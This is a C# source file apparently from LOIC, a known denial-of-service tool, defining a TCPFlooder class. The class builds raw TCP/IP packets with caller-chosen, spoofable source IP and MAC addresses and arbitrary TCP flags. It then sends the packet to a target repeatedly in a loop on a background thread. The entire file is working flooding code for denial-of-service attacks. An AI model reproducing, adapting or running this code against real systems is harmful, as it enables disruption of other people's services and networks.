using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.ComponentModel;
using System.Text;

namespace LOIC
{
	public class TCPFlooder
	{
		public bool IsFlooding;
		public int FloodCount;
		public int Delay;
		public Packet Packet;
		public PacketDevice SelectedDevice;

		public TCPFlooder(Packet packet, PacketDevice selectedDevice, int delay)
		{
			this.Delay = delay;
			this.Packet = packet;
			if (selectedDevice == null) throw new Exception("Select an adapter!");
			this.SelectedDevice = selectedDevice;
		}

		public void Start()
		{
			IsFlooding = true;
			BackgroundWorker bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bgw_DoWork);
			bw.RunWorkerAsync();
		}

		private void bgw_DoWork(object sender, DoWorkEventArgs e)
		{
			// set interface
			PacketCommunicator communicator = SelectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);

			// loop here for packet sending
			try
			{
				while (IsFlooding)
				{
						while (IsFlooding)
						{
							FloodCount++;
							//buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(PayloadData, (AllowRandom ? Utils.RandomString() : null)));
							communicator.SendPacket(Packet);
							if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
						}

				}
			}
			catch
			{
			}

		}

		public static Packet BuildTcpPacket(string sourceIP, string destinationIP, int sourcePort, int destinationPort, Flags flags,
			 string payload, string sourceMac, string destinationMac, ushort id, byte ttl, uint sequenceNumber,
			 uint acknowledgmentNumber, ushort window)
		{
			if (sourceIP == null) throw new ArgumentNullException("SourceIP");
			EthernetLayer ethernetLayer = new EthernetLayer
			{
				Source = new MacAddress(sourceMac),
				Destination = new MacAddress(destinationMac),
				EtherType = EthernetType.None, // Will be filled automatically.
			};

			IpV4Layer ipV4Layer = new IpV4Layer
			{
				Source = new IpV4Address(sourceIP),
				CurrentDestination = new IpV4Address(destinationIP),
				Fragmentation = IpV4Fragmentation.None,
				HeaderChecksum = null, // Will be filled automatically.
				Identification = id,
				Options = IpV4Options.None,
				Protocol = null, // Will be filled automatically.
				Ttl = ttl,
				TypeOfService = 0,
			};

			// flag fun here later
			TcpLayer tcpLayer = new TcpLayer();
			tcpLayer.SourcePort = (ushort)sourcePort;
			tcpLayer.DestinationPort = (ushort)destinationPort;
			tcpLayer.Checksum = null;// Will be filled automatically.
			tcpLayer.SequenceNumber = sequenceNumber;
			tcpLayer.AcknowledgmentNumber = acknowledgmentNumber;
			if (flags.SYN)
				tcpLayer.ControlBits ^= TcpControlBits.Synchronize;
			if (flags.ACK)
				tcpLayer.ControlBits ^= TcpControlBits.Acknowledgment;
			if (flags.FIN)
				tcpLayer.ControlBits ^= TcpControlBits.Fin;
			if (flags.RST)
				tcpLayer.ControlBits ^= TcpControlBits.Reset;
			if (flags.URG)
				tcpLayer.ControlBits ^= TcpControlBits.Urgent;
			if (flags.PSH)
				tcpLayer.ControlBits ^= TcpControlBits.Push;
			if (flags.CWR)
				tcpLayer.ControlBits ^= TcpControlBits.CongestionWindowReduced;
			if (flags.ENC)
				tcpLayer.ControlBits ^= TcpControlBits.ExplicitCongestionNotificationEcho;
			if (flags.NS)
				tcpLayer.ControlBits ^= TcpControlBits.NonceSum; // not a flag, rather a tcp header bit set
			if (flags.NONE)
				tcpLayer.ControlBits ^= TcpControlBits.None;

			tcpLayer.Window = window;
			tcpLayer.UrgentPointer = 0;
			tcpLayer.Options = TcpOptions.None;

			PayloadLayer payloadLayer = new PayloadLayer
			{
				Data = new Datagram(Encoding.ASCII.GetBytes(payload)),
			};

			PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer, payloadLayer);

			return builder.Build(DateTime.Now);
		}



	}
}